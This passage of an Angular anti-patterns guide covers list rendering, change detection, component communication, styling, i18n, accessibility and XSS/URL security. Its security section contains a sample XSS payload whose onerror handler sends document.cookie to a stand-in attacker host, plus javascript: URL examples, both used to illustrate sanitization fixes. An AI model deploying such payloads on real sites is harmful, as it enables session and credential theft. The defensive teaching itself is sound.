- **Hot vs Cold observables:** HTTP requests are cold; each subscription triggers a request
- **Resource pattern** (v17+) handles loading/error states automatically

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-negated-async": "error"
}
```

**Best Practices Checklist:**
- ✅ Use `shareReplay(1)` in components returning observables
- ✅ Subscribe once with `*ngIf="obs$ | async as value"` syntax
- ✅ Prefer signals for simpler state management (v17+)
- ✅ Use resource pattern for async data loading (v17+)

---

## 5. LISTS & RENDERING PERFORMANCE

### 5.1 Large Lists Without Virtual Scrolling

**Name:** Rendering All Items at Once

**Short Description:** Rendering all items in a large list to the DOM, regardless of viewport visibility.

**Why It's Bad:**
- **Performance:** Thousands of DOM nodes = slow initial render, laggy scrolling
- **Memory:** All nodes kept in memory, even if not visible
- **Change Detection:** Every item re-evaluated on change detection cycles
- **Accessibility:** Screen readers struggle with massive DOM trees
- **Mobile:** Noticeable jank and battery drain

**Typical Symptoms:**
```html
<!-- Rendering 10,000 items at once -->
<div *ngFor="let item of largeList; trackBy: trackByFn">
  {{ item.name }}
</div>
```

**Bad Example:**
```typescript
export class LargeListComponent {
  @Input() items: Item[] = []; // Could be 10,000+ items
  
  trackByItemId(index: number, item: Item): string {
    return item.id;
  }
}
```

```html
<div class="items-container">
  <!-- All 10,000 items rendered; only ~20 visible in viewport -->
  <div *ngFor="let item of items; trackBy: trackByItemId" class="item">
    {{ item.name }} - {{ item.description }}
  </div>
</div>
```

**Better Fix:**

*Option 1: CDK Virtual Scrolling (Recommended)*
```typescript
import { ScrollingModule } from '@angular/cdk/scrolling';

@Component({
  selector: 'app-large-list',
  imports: [ScrollingModule, NgFor],
  template: `
    <cdk-virtual-scroll-viewport itemSize="50" class="viewport">
      <div *cdkVirtualFor="let item of items; trackBy: trackByItemId" class="item">
        {{ item.name }} - {{ item.description }}
      </div>
    </cdk-virtual-scroll-viewport>
  `,
  styles: [`
    .viewport {
      height: 600px;
    }
    .item {
      height: 50px;
    }
  `]
})
export class LargeListComponent {
  @Input() items: Item[] = [];
  
  trackByItemId(index: number, item: Item): string {
    return item.id;
  }
}
```

*Option 2: Pagination (Alternative)*
```typescript
export class PaginatedListComponent {
  @Input() items: Item[] = [];
  pageSize = 20;
  currentPage = signal(1);
  
  paginatedItems = computed(() => {
    const start = (this.currentPage() - 1) * this.pageSize;
    return this.items.slice(start, start + this.pageSize);
  });
  
  totalPages = computed(() => 
    Math.ceil(this.items.length / this.pageSize)
  );
  
  goToPage(page: number): void {
    this.currentPage.set(Math.min(page, this.totalPages()));
  }
}
```

```html
<div>
  @for (item of paginatedItems(); track item.id) {
    <div class="item">{{ item.name }}</div>
  }
</div>

<div class="pagination">
  <button (click)="goToPage(currentPage() - 1)" [disabled]="currentPage() === 1">
    Previous
  </button>
  <span>Page {{ currentPage() }} of {{ totalPages() }}</span>
  <button (click)="goToPage(currentPage() + 1)" [disabled]="currentPage() === totalPages()">
    Next
  </button>
</div>
```

*Option 3: Infinite Scroll (Load More)*
```typescript
export class InfiniteScrollListComponent implements OnInit {
  @Input() itemService!: ItemService;
  
  items = signal<Item[]>([]);
  isLoading = signal(false);
  hasMore = signal(true);
  private page = 0;
  
  ngOnInit(): void {
    this.loadMore();
  }
  
  loadMore(): void {
    if (this.isLoading() || !this.hasMore()) return;
    
    this.isLoading.set(true);
    this.itemService.getItems(this.page, 20).subscribe({
      next: (newItems) => {
        if (newItems.length < 20) this.hasMore.set(false);
        this.items.update(items => [...items, ...newItems]);
        this.page++;
        this.isLoading.set(false);
      }
    });
  }
  
  onScroll(event: any): void {
    const { scrollTop, scrollHeight, clientHeight } = event.target;
    if (scrollHeight - scrollTop <= clientHeight + 200) {
      this.loadMore();
    }
  }
}
```

**Notes for Modern Angular:**
- **CDK Virtual Scrolling** is the preferred solution for large lists
- **Fixed item heights** required for virtual scrolling accuracy
- **Pagination** is good for server-side filtering/sorting
- **Infinite scroll** requires careful scroll event handling
- **Combined with trackBy** for optimal performance

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/use-track-by-function": "error"
}
```

**Best Practices Checklist:**
- ✅ Use CDK virtual scrolling for lists > 100 items
- ✅ Implement proper trackBy functions
- ✅ Handle loading states during pagination
- ✅ Set fixed item heights for virtual scroll accuracy
- ✅ Profile performance with DevTools before/after optimization

---

### 5.2 No OnPush Change Detection Strategy

**Name:** Default Change Detection on Large Components

**Short Description:** Using the default ChangeDetectionStrategy (CheckAlways) instead of OnPush, causing unnecessary change detection on unrelated events.

**Why It's Bad:**
- **Performance:** Component checks on EVERY global change detection cycle
- **Scaling:** Performance degrades with component tree depth
- **CPU:** Wasted CPU cycles checking unmodified components
- **User Input:** Lag during typing, scrolling, or animations

**Typical Symptoms:**
```typescript
@Component({
  selector: 'app-user-card',
  template: '...'
  // No changeDetection specified = CheckAlways (default)
})
export class UserCardComponent {
  @Input() user!: User;
}
```

When parent changes unrelated data, this component still re-checks.

**Bad Example:**
```typescript
@Component({
  selector: 'app-dashboard',
  template: `
    <app-user-card [user]="user"></app-user-card>
    <app-stats [data]="stats"></app-stats>
    <input [(ngModel)]="searchTerm"> <!-- Typing here triggers check in UserCard too -->
  `
})
export class DashboardComponent {
  @Input() user!: User;
  @Input() stats!: Stats;
  searchTerm = '';
}
```

**Better Fix:**

```typescript
import { ChangeDetectionStrategy } from '@angular/core';

@Component({
  selector: 'app-user-card',
  template: '{{ user.name }}',
  changeDetection: ChangeDetectionStrategy.OnPush // Only check on input change
})
export class UserCardComponent {
  @Input() user!: User;
}
```

**Important:** OnPush requires **immutable updates** for change detection to work:

```typescript
// ❌ WON'T TRIGGER OnPush (mutation, no reference change)
this.user.name = 'Updated';

// ✅ WILL TRIGGER OnPush (new reference)
this.user = { ...this.user, name: 'Updated' };
```

**Full Example with OnPush + Signals (v17+):**

```typescript
@Component({
  selector: 'app-user-card',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [CommonModule],
  template: `
    <div class="card">
      <h3>{{ user().name }}</h3>
      <p>{{ user().email }}</p>
      <p>Role: {{ userRole() }}</p>
    </div>
  `
})
export class UserCardComponent {
  user = input.required<User>();
  
  // Computed memoizes; only updates when user() changes
  userRole = computed(() => 
    this.user().role.charAt(0).toUpperCase() + this.user().role.slice(1)
  );
}
```

**Notes for Modern Angular:**
- **Always use OnPush** with modern Angular (v17+); it's the default mindset
- **Immutable updates** required; use spread operator or Object.assign
- **Signals** work naturally with OnPush; memoized computed properties
- **Observables** with async pipe work correctly with OnPush
- **Manual markForCheck()** rarely needed with OnPush + signals/observables

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/prefer-on-push-component-change-detection": "warn"
}
```

**Best Practices Checklist:**
- ✅ Use `ChangeDetectionStrategy.OnPush` on all presentational components
- ✅ Always update via immutable operations (spread, assign, etc.)
- ✅ Use signals with computed properties for derived data
- ✅ Combine OnPush + async pipe for reactive components
- ✅ Profile component trees to identify CheckAlways bottlenecks

---

## 6. COMPONENT INTERACTION

### 6.1 Heavy Use of Two-Way Binding Between Parent and Child

**Name:** Bidirectional Communication Coupling

**Short Description:** Extensive use of two-way binding `[(property)]` between parent and child components, creating tight coupling and hidden data flows.

**Why It's Bad:**
- **Coupling:** Parent and child tightly coupled; hard to refactor
- **Data Flow:** Unclear how data changes; hard to debug
- **Testing:** Must test parent and child together
- **Reusability:** Component not truly reusable if it modifies parent state
- **Maintenance:** Changes to parent indirectly affect child behavior

**Typical Symptoms:**
```html
<!-- Child modifies parent data through two-way binding -->
<app-user-form [(user)]="currentUser"></app-user-form>
```

**Bad Example:**
```typescript
// Parent
@Component({
  selector: 'app-admin-panel',
  template: `
    <app-user-form [(user)]="selectedUser"></app-user-form>
    <p>Current user: {{ selectedUser.name }}</p>
  `
})
export class AdminPanelComponent {
  selectedUser: User = { name: '', email: '', role: 'user' };
}
```

```typescript
// Child
@Component({
  selector: 'app-user-form',
  template: `
    <input [(ngModel)]="user.name">
    <input [(ngModel)]="user.email">
  `
})
export class UserFormComponent {
  @Input() @Output() user!: User; // Two-way sync; parent object mutated
}
```

**Better Fix:**

*Option 1: Input + Output Events (Explicit)*
```typescript
// Parent
@Component({
  selector: 'app-admin-panel',
  template: `
    <app-user-form 
      [user]="selectedUser"
      (userChange)="onUserChange($event)">
    </app-user-form>
    <p>Current user: {{ selectedUser.name }}</p>
  `
})
export class AdminPanelComponent {
  selectedUser: User = { name: '', email: '', role: 'user' };
  
  onUserChange(updatedUser: User): void {
    this.selectedUser = updatedUser; // Immutable update
  }
}
```

```typescript
// Child
@Component({
  selector: 'app-user-form',
  template: `
    <input 
      [ngModel]="user.name"
      (ngModelChange)="onNameChange($event)">
    <input 
      [ngModel]="user.email"
      (ngModelChange)="onEmailChange($event)">
  `
})
export class UserFormComponent {
  @Input() user!: User;
  @Output() userChange = new EventEmitter<User>();
  
  onNameChange(name: string): void {
    this.userChange.emit({ ...this.user, name });
  }
  
  onEmailChange(email: string): void {
    this.userChange.emit({ ...this.user, email });
  }
}
```

*Option 2: Output Events Only (Recommended)*
```typescript
// Parent
@Component({
  selector: 'app-admin-panel',
  template: `
    <app-user-form 
      [user]="selectedUser"
      (save)="onSaveUser($event)">
    </app-user-form>
  `
})
export class AdminPanelComponent {
  selectedUser: User = { name: '', email: '', role: 'user' };
  
  onSaveUser(user: User): void {
    this.selectedUser = user;
    this.userService.updateUser(user).subscribe(...);
  }
}
```

```typescript
// Child
@Component({
  selector: 'app-user-form',
  template: `
    <form [formGroup]="form" (ngSubmit)="onSave()">
      <input formControlName="name">
      <input formControlName="email">
      <button type="submit">Save</button>
    </form>
  `
})
export class UserFormComponent {
  @Input() user!: User;
  @Output() save = new EventEmitter<User>();
  
  form = this.fb.group({
    name: ['', Validators.required],
    email: ['', Validators.required]
  });
  
  ngOnInit(): void {
    this.form.patchValue(this.user);
  }
  
  onSave(): void {
    if (this.form.invalid) return;
    this.save.emit(this.form.value as User);
  }
}
```

*Option 3: Container/Presentational Pattern (Modern)*
```typescript
// Smart Container Component
@Component({
  selector: 'app-user-editor',
  template: `
    <app-user-form-presenter 
      [user]="currentUser()"
      (save)="onSaveUser($event)">
    </app-user-form-presenter>
  `,
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class UserEditorComponent {
  currentUser = signal<User | null>(null);
  
  constructor(private userService: UserService) {
    this.loadUser(123);
  }
  
  loadUser(id: number): void {
    this.userService.getUser(id).subscribe(user => 
      this.currentUser.set(user)
    );
  }
  
  onSaveUser(user: User): void {
    this.userService.updateUser(user).subscribe(updated => 
      this.currentUser.set(updated)
    );
  }
}
```

```typescript
// Dumb Presentational Component
@Component({
  selector: 'app-user-form-presenter',
  template: `
    <form [formGroup]="form" (ngSubmit)="onSave()">
      <input formControlName="name">
      <input formControlName="email">
      <button type="submit">Save</button>
    </form>
  `,
  changeDetection: ChangeDetectionStrategy.OnPush
})
export class UserFormPresenterComponent {
  @Input() user!: User;
  @Output() save = new EventEmitter<User>();
  
  form = this.fb.group({
    name: ['', Validators.required],
    email: ['', Validators.required]
  });
  
  ngOnInit(): void {
    this.form.patchValue(this.user);
  }
  
  onSave(): void {
    if (this.form.invalid) return;
    this.save.emit(this.form.value as User);
  }
}
```

**Notes for Modern Angular:**
- **Explicit output events** are clearer than two-way binding
- **Container/Presentational pattern** separates state management from presentation
- **Signals with input/output** (v17+) provide reactive data flow
- **Form-based updates** (Reactive Forms) are preferred over direct mutations

**Recommended Lint Rules:**
```json
{
  "no-two-way-binding-on-inputs": "error"
}
```

**Best Practices Checklist:**
- ✅ Use Input + Output for parent-child communication
- ✅ Emit copies, not mutations
- ✅ Consider container/presentational split for complex components
- ✅ Use explicit event names in outputs (save, delete, update)
- ✅ Avoid two-way binding except for form controls

---

### 6.2 No Component Encapsulation (View Encapsulation Not Set)

**Name:** Leaking Component Styles

**Short Description:** Not using ViewEncapsulation, causing component styles to leak into global scope or parent styles to override unintentionally.

**Why It's Bad:**
- **CSS Specificity:** Global styles can override component styles unexpectedly
- **Maintenance:** Hard to predict CSS behavior with style conflicts
- **Reusability:** Component styles depend on global context
- **Isolation:** Component's visual behavior changes based on where it's used
- **Testing:** Style tests become fragile with external dependencies

**Typical Symptoms:**
```typescript
@Component({
  selector: 'app-card',
  template: '<div class="card">{{ content }}</div>',
  styles: [`
    .card { background: blue; } /* This might leak! */
  `]
  // No ViewEncapsulation—defaults to Emulated
})
```

**Bad Example:**
```typescript
// Parent
@Component({
  selector: 'app-dashboard',
  styles: [`
    .card { background: red; } /* Might override child's blue */
  `]
})
export class DashboardComponent {}

// Child
@Component({
  selector: 'app-card',
  styles: [`
    .card { background: blue; } /* Might be overridden */
  `]
})
export class CardComponent {}
```

**Better Fix:**

*Option 1: Encapsulated Styles (Recommended)*
```typescript
import { ViewEncapsulation } from '@angular/core';

@Component({
  selector: 'app-card',
  template: '<div class="card">{{ content }}</div>',
  styles: [`
    .card { 
      background: blue; 
      padding: 1rem;
    }
  `],
  encapsulation: ViewEncapsulation.Emulated // Default; good for most cases
})
export class CardComponent {
  @Input() content: string = '';
}
```

*Option 2: Shadow DOM Encapsulation (Full Isolation)*
```typescript
@Component({
  selector: 'app-card',
  template: '<div class="card">{{ content }}</div>',
  styles: [`
    .card { 
      background: blue; 
      padding: 1rem;
    }
  `],
  encapsulation: ViewEncapsulation.ShadowDom // Full CSS isolation
})
export class CardComponent {
  @Input() content: string = '';
}
```

*Option 3: Using CSS Variables for Theming (Best Practice)*
```typescript
@Component({
  selector: 'app-card',
  template: '<div class="card">{{ content }}</div>',
  styles: [`
    :host {
      --card-bg: blue;
      --card-padding: 1rem;
    }
    
    .card { 
      background: var(--card-bg); 
      padding: var(--card-padding);
    }
  `],
  encapsulation: ViewEncapsulation.Emulated
})
export class CardComponent {
  @Input() content: string = '';
  @Input() bgColor: string = 'blue';
  
  constructor(private el: ElementRef) {}
  
  ngOnInit(): void {
    this.el.nativeElement.style.setProperty('--card-bg', this.bgColor);
  }
}
```

**Notes for Modern Angular:**
- **ViewEncapsulation.Emulated** is default; balances isolation and compatibility
- **ViewEncapsulation.ShadowDom** provides true CSS isolation but has browser limitations
- **CSS Variables** allow parent components to customize child styles without breaking encapsulation
- **BEM naming convention** (Block Element Modifier) reduces collisions if encapsulation unavailable

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/prefer-on-push-component-change-detection": "warn"
}
```

**Best Practices Checklist:**
- ✅ Always set encapsulation explicitly (even if using default)
- ✅ Use CSS variables for styling customization
- ✅ Avoid global CSS classes in components
- ✅ Use BEM or scoped naming conventions
- ✅ Document CSS API for customizable components

---

## 7. INTERNATIONALIZATION & ACCESSIBILITY

### 7.1 No i18n Integration (Hardcoded Strings)

**Name:** Hardcoded Translatable Content

**Short Description:** Hardcoding user-facing text in templates instead of using Angular's i18n system.

**Why It's Bad:**
- **Maintainability:** Text scattered across templates; hard to translate consistently
- **Scalability:** Adding new languages requires hunting through code
- **Translation:** Translators can't easily identify strings to translate
- **Testing:** Can't test different languages
- **Professionalism:** Hardcoded strings look unprofessional for international apps

**Typical Symptoms:**
```html
<!-- Hardcoded strings in template -->
<h1>Welcome</h1>
<p>Please enter your email address</p>
<button>Submit</button>
```

**Bad Example:**
```typescript
@Component({
  selector: 'app-login',
  template: `
    <form (ngSubmit)="onSubmit()">
      <h1>Login</h1>
      <label>Username</label>
      <input [(ngModel)]="username">
      
      <label>Password</label>
      <input [(ngModel)]="password" type="password">
      
      <button type="submit">Sign In</button>
      <a href="/forgot">Forgot password?</a>
    </form>
  `
})
export class LoginComponent {}
```

**Better Fix:**

*Setup i18n (One-time)*
```bash
ng extract-i18n --output-path locale
```

This creates `messages.xlf` file for translation.

*Option 1: i18n Attributes in Template*
```html
<!-- messages.xlf will extract these for translation -->
<form (ngSubmit)="onSubmit()">
  <h1 i18n="@@login.title">Login</h1>
  
  <label i18n="@@login.username.label">Username</label>
  <input [(ngModel)]="username" name="username">
  
  <label i18n="@@login.password.label">Password</label>
  <input [(ngModel)]="password" type="password" name="password">
  
  <button type="submit" i18n="@@login.signin.button">Sign In</button>
  <a href="/forgot" i18n="@@login.forgot.link">Forgot password?</a>
</form>
```

*Option 2: Using $localize for Dynamic Strings*
```typescript
import { $localize } from '@angular/localize';

export class LoginComponent {
  readonly welcomeMessage = $localize`Welcome to our application`;
  readonly errorMessage = $localize`Invalid credentials`;
}
```

*Option 3: Translation Service (Alternative)*
```typescript
import { TranslateService } from '@ngx-translate/core';

@Component({
  selector: 'app-login',
  template: `
    <h1>{{ 'LOGIN.TITLE' | translate }}</h1>
    <label>{{ 'LOGIN.USERNAME' | translate }}</label>
    <button>{{ 'LOGIN.SIGNIN' | translate }}</button>
  `
})
export class LoginComponent {
  constructor(translate: TranslateService) {
    translate.setDefaultLanguage('en');
  }
}
```

**Translate file (en.json):**
```json
{
  "LOGIN": {
    "TITLE": "Login",
    "USERNAME": "Username",
    "SIGNIN": "Sign In"
  }
}
```

**Notes for Modern Angular:**
- **Built-in i18n** is preferred for new projects (Angular Localize)
- **ngx-translate** is popular alternative for dynamic language switching
- **Extract early:** Run extraction regularly as development proceeds
- **Translation context:** Use ID and description for translator clarity
- **Locale imports:** Build separate bundles per language

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/i18n-check-message-id": "warn"
}
```

**Best Practices Checklist:**
- ✅ No hardcoded user-facing text
- ✅ Mark all translatable strings with i18n attribute
- ✅ Use meaningful translation IDs
- ✅ Extract translations regularly
- ✅ Include context/description for translators

---

### 7.2 Missing Accessibility Attributes (a11y)

**Name:** Incomplete ARIA and Semantic Markup

**Short Description:** Missing ARIA attributes, semantic HTML, and accessibility considerations, making the app inaccessible to screen readers and keyboard users.

**Why It's Bad:**
- **Inclusivity:** Users with disabilities can't access the application
- **Legal:** May violate WCAG 2.1 AA standards (legal requirement in many jurisdictions)
- **Testing:** Can't be tested with accessibility tools
- **UX:** Reduced usability for all users (keyboard navigation, etc.)
- **Reputation:** Demonstrates poor engineering practices

**Typical Symptoms:**
```html
<!-- Non-semantic, no ARIA attributes -->
<div (click)="openDialog()" role="button">Open</div>
<div @click="deleteItem()">Delete</div>
<input type="text"> <!-- No label; screen reader doesn't know what it's for -->
```

**Bad Example:**
```html
<form (ngSubmit)="onSubmit()">
  <div>
    <div>Username</div>
    <input type="text" name="username">
  </div>
  
  <div>
    <div>Password</div>
    <input type="password" name="password">
  </div>
  
  <div @click="submit()" class="submit-button">
    Sign In
  </div>
  
  <!-- No error messaging for accessibility -->
  <div *ngIf="error" class="error">{{ error }}</div>
</form>
```

**Better Fix:**

*Option 1: Semantic HTML + ARIA*
```html
<form (ngSubmit)="onSubmit()" novalidate>
  <!-- Proper label association -->
  <div class="form-group">
    <label for="username" class="form-label">
      Username
      <span aria-label="required">*</span>
    </label>
    <input 
      id="username"
      type="text"
      name="username"
      required
      aria-required="true"
      aria-describedby="username-error"
      [attr.aria-invalid]="submitted && form.get('username')?.invalid">
    <div 
      id="username-error" 
      class="error-message"
      role="alert"
      *ngIf="submitted && form.get('username')?.invalid">
      Username is required
    </div>
  </div>
  
  <!-- Proper label association -->
  <div class="form-group">
    <label for="password" class="form-label">
      Password
      <span aria-label="required">*</span>
    </label>
    <input 
      id="password"
      type="password"
      name="password"
      required
      aria-required="true"
      aria-describedby="password-error"
      [attr.aria-invalid]="submitted && form.get('password')?.invalid">
    <div 
      id="password-error" 
      class="error-message"
      role="alert"
      *ngIf="submitted && form.get('password')?.invalid">
      Password is required
    </div>
  </div>
  
  <!-- Semantic button element -->
  <button 
    type="submit" 
    class="btn btn-primary"
    [disabled]="form.invalid || isSubmitting()"
    [attr.aria-busy]="isSubmitting()">
    {{ isSubmitting() ? 'Signing in...' : 'Sign In' }}
  </button>
  
  <!-- Error summary for screen readers -->
  <div 
    role="alert" 
    aria-live="polite"
    aria-atomic="true"
    *ngIf="submitted && form.invalid">
    Please correct the errors above before submitting.
  </div>
</form>
```

*Option 2: Custom Accessible Component*
```typescript
@Component({
  selector: 'app-text-input',
  template: `
    <label [for]="inputId" class="form-label">
      {{ label }}
      <span *ngIf="required" aria-label="required">*</span>
    </label>
    <input 
      [id]="inputId"
      [type]="type"
      [formControl]="control"
      [attr.aria-required]="required"
      [attr.aria-describedby]="control.invalid ? errorId : null"
      [attr.aria-invalid]="control.invalid && control.touched">
    <div 
      [id]="errorId"
      role="alert"
      class="error-message"
      *ngIf="control.invalid && control.touched">
      {{ getErrorMessage() }}
    </div>
  `
})
export class TextInputComponent {
  @Input() label!: string;
  @Input() type: string = 'text';
  @Input() control!: FormControl;
  @Input() required: boolean = false;
  
  inputId = `input-${Math.random().toString(36).substr(2, 9)}`;
  errorId = `${this.inputId}-error`;
  
  getErrorMessage(): string {
    const errors = this.control.errors;
    if (errors?.['required']) return `${this.label} is required`;
    if (errors?.['email']) return 'Invalid email format';
    if (errors?.['minlength']) {
      return `Minimum ${errors['minlength'].requiredLength} characters`;
    }
    return 'Invalid input';
  }
}
```

*Option 3: Using Angular Material (Accessible by Default)*
```typescript
import { MatFormFieldModule, MatInputModule, MatButtonModule } from '@angular/material';

@Component({
  selector: 'app-login',
  imports: [MatFormFieldModule, MatInputModule, MatButtonModule],
  template: `
    <mat-form-field appearance="outline">
      <mat-label>Username</mat-label>
      <input 
        matInput 
        formControlName="username"
        required>
      <mat-error *ngIf="form.get('username')?.hasError('required')">
        Username is required
      </mat-error>
    </mat-form-field>
    
    <mat-form-field appearance="outline">
      <mat-label>Password</mat-label>
      <input 
        matInput 
        type="password"
        formControlName="password"
        required>
      <mat-error *ngIf="form.get('password')?.hasError('required')">
        Password is required
      </mat-error>
    </mat-form-field>
    
    <button mat-raised-button color="primary">
      Sign In
    </button>
  `
})
export class LoginComponent {}
```

**Common ARIA Attributes:**
- `aria-label`: Descriptive name for screen readers
- `aria-labelledby`: Reference to element that labels this one
- `aria-describedby`: Additional description ID
- `aria-required`: Indicates required form fields
- `aria-invalid`: Indicates validation error state
- `aria-live`: Announces dynamic content (polite, assertive)
- `aria-busy`: Indicates loading state
- `role`: Semantic role when semantic element unavailable

**Notes for Modern Angular:**
- **Use semantic HTML first:** `<button>`, `<label>`, `<input>`, etc.
- **Angular Material** components are accessibility-compliant by default
- **Test with screen readers:** NVDA (Windows), JAWS, VoiceOver (Mac)
- **Keyboard navigation:** Ensure all interactive elements are keyboard-accessible
- **Color contrast:** Verify sufficient contrast (WCAG AA minimum)

**Recommended Lint Rules:**
```json
{
  "@angular-eslint/template/no-negated-async": "error",
  "jsx-a11y/label-has-associated-control": "warn"
}
```

**Best Practices Checklist:**
- ✅ Use semantic HTML elements
- ✅ All form inputs have labels
- ✅ All interactive elements keyboard-accessible
- ✅ Use ARIA attributes when semantic HTML insufficient
- ✅ Test with screen readers before release
- ✅ Verify color contrast ratios (4.5:1 for text)
- ✅ Implement skip links for navigation
- ✅ Use aria-live for dynamic content

---

## 8. SECURITY

### 8.1 No DomSanitizer When Using innerHTML/[innerHTML]

**Name:** Unsafe DOM Content Binding

**Short Description:** Binding untrusted user-generated HTML directly to `[innerHTML]` without sanitization, creating XSS vulnerabilities.

**Why It's Bad:**
- **Security:** XSS (Cross-Site Scripting) attacks; attackers inject malicious scripts
- **User Data Theft:** Scripts can steal sessions, credentials, personal data
- **Malware:** Injected scripts can redirect users to malicious sites
- **Trust:** Users' data compromised; reputation damage
- **Compliance:** Violates security standards (OWASP, PCI-DSS)

**Typical Symptoms:**
```html
<!-- Direct binding of user content—DANGEROUS -->
<div [innerHTML]="userComment"></div>
<!-- If userComment = '<img src=x onerror="alert(1)">', this executes! -->
```

**Bad Example:**
```typescript
@Component({
  selector: 'app-comment',
  template: `
    <div class="comment-body">
      <!-- User-generated HTML bound directly; allows XSS -->
      <p [innerHTML]="comment.body"></p>
    </div>
  `
})
export class CommentComponent {
  @Input() comment!: Comment;
}
```

If `comment.body` contains: `<img src=x onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">`

**Better Fixes:**

*Option 1: DomSanitizer (Safe Approach)*
```typescript
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-comment',
  template: `
    <div class="comment-body">
      <!-- Sanitized HTML; safe to render -->
      <p [innerHTML]="sanitizedBody"></p>
    </div>
  `
})
export class CommentComponent implements OnInit {
  @Input() comment!: Comment;
  sanitizedBody!: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  ngOnInit(): void {
    // Sanitizes HTML; removes dangerous elements/attributes
    this.sanitizedBody = this.sanitizer.sanitize(
      SecurityContext.HTML, 
      this.comment.body
    ) || '';
  }
}
```

*Option 2: DomSanitizer.bypassSecurityTrustHtml (Use Sparingly)*
```typescript
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-trusted-content',
  template: `
    <div [innerHTML]="trustedHtml"></div>
  `
})
export class TrustedContentComponent {
  @Input() htmlContent!: string;
  trustedHtml!: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  ngOnInit(): void {
    // ONLY use if HTML comes from trusted source (your backend, not users)
    // Otherwise = XSS vulnerability
    this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(this.htmlContent);
  }
}
```

*Option 3: Text Content Only (Safest)*
```html
<!-- No HTML binding; just text -->
<div class="comment-body">
  <p>{{ comment.body }}</p>
</div>
```

This prevents all XSS attacks. Use unless HTML rendering required.

*Option 4: Markdown Library (Modern)*
```typescript
import { marked } from 'marked';
import { DomSanitizer } from '@angular/platform-browser';

@Component({
  selector: 'app-markdown-content',
  template: `
    <div [innerHTML]="htmlContent"></div>
  `
})
export class MarkdownContentComponent implements OnInit {
  @Input() markdown!: string;
  htmlContent!: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  ngOnInit(): void {
    // Markdown is parsed and sanitized
    const html = marked(this.markdown);
    this.htmlContent = this.sanitizer.sanitize(SecurityContext.HTML, html) || '';
  }
}
```

**Notes for Modern Angular:**
- **Default:** Angular's template syntax sanitizes all bindings automatically
- **[innerHTML] binding:** Bypasses default sanitization; use DomSanitizer
- **Never use `innerHTML` property directly:** Use `[innerHTML]` binding + DomSanitizer
- **Backend validation:** Always validate/sanitize on server too (defense in depth)
- **Content Security Policy:** Configure CSP headers to prevent inline scripts
- **Regular updates:** Keep Angular and dependencies updated for security patches

**Recommended Lint Rules:**
```json
{
  "no-bypassSecurityTrustHtml": "error",
  "security/detect-non-literal-regexp": "warn"
}
```

**Best Practices Checklist:**
- ✅ Never bind user-generated HTML directly
- ✅ Use DomSanitizer for user content
- ✅ Use text interpolation `{{ }}` when HTML not needed
- ✅ Only use bypassSecurityTrustHtml for trusted sources
- ✅ Sanitize on backend too (defense in depth)
- ✅ Implement Content Security Policy headers
- ✅ Regular security audits and dependency updates

---

### 8.2 Trusting External URLs Without Validation

**Name:** Unsanitized URL Bindings

**Short Description:** Binding user-generated or external URLs to href attributes without validation, allowing JavaScript protocol execution or open redirect attacks.

**Why It's Bad:**
- **Open Redirects:** Users tricked into visiting phishing sites
- **JavaScript Execution:** URLs like `javascript:alert('XSS')` execute code
- **Data Exfiltration:** Attackers redirect users to steal credentials
- **Trust Violation:** Users expect links to go where they appear to go

**Typical Symptoms:**
```html
<!-- User-generated URL bound directly -->
<a [href]="userProvidedUrl">Click here</a>
<!-- If userProvidedUrl = 'javascript:alert(1)', code executes! -->
```

**Bad Example:**
```typescript
@Component({
  selector: 'app-user-profile',
  template: `
    <div class="profile">
      <a [href]="user.website">Visit website</a>
    </div>
  `
})
export class UserProfileComponent {
  @Input() user!: User; // user.website might be 'javascript:alert(1)'
}
```

**Better Fixes:**

*Option 1: URL Sanitization (Safe)*
```typescript
import { DomSanitizer, SafeUrl } from '@angular/platform-browser';

@Component({
  selector: 'app-user-profile',
  template: `
    <div class="profile">
      <a [href]="sanitizedWebsite" target="_blank" rel="noopener noreferrer">
        Visit website
      </a>
    </div>
  `
})
export class UserProfileComponent implements OnInit {
  @Input() user!: User;
  sanitizedWebsite!: SafeUrl;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  ngOnInit(): void {
    // Sanitizes URL; removes javascript: protocol
    this.sanitizedWebsite = this.sanitizer.sanitize(
      SecurityContext.URL,
      this.user.website
    );
  }
}
```

*Option 2: Whitelist Allowed Protocols*
```typescript
@Component({
  selector: 'app-link',
  template: `
    <a [href]="isSafeUrl(url) ? url : null" [attr.target]="newTab ? '_blank' : '_self'">
      {{ label }}
    </a>
  `
})
export class LinkComponent {
  @Input() url!: string;
  @Input() label!: string;
  @Input() newTab: boolean = false;
  
  isSafeUrl(url: string): boolean {
    try {
      const parsed = new URL(url);
      // Only allow http, https, mailto, tel protocols
      return ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol);
    } catch {
      // Invalid URL
      return false;
    }
  }
}
```

*Option 3: Strong Typing (Best)*
```typescript
@Component({
  selector: 'app-user-profile',
  template: `
    <div class="profile">
      <a [href]="user.website | safeUrl" target="_blank" rel="noopener noreferrer">
        Visit website
      </a>
    </div>
  `
})
export class UserProfileComponent {
  @Input() user!: User;
}

@Pipe({
  name: 'safeUrl'
})
export class SafeUrlPipe implements PipeTransform {
  constructor(private sanitizer: DomSanitizer) {}
  
  transform(url: string | null | undefined): SafeUrl {
    if (!url) return this.sanitizer.sanitize(SecurityContext.URL, '') || '';
    
    try {
      const parsed = new URL(url);
      if (['http:', 'https:'].includes(parsed.protocol)) {
        return this.sanitizer.sanitize(SecurityContext.URL, url) || '';
      }
    } catch {
      // Invalid URL
    }
    return '';
  }
}
```

*Option 4: Backend Validation (Recommended)*
```typescript
// On backend:
// 1. Validate URL format
// 2. Validate against whitelist if applicable
// 3. Return safe URLs only

export class UserService {
  getUser(id: number): Observable<User> {
    // Backend returns user with validated website URL
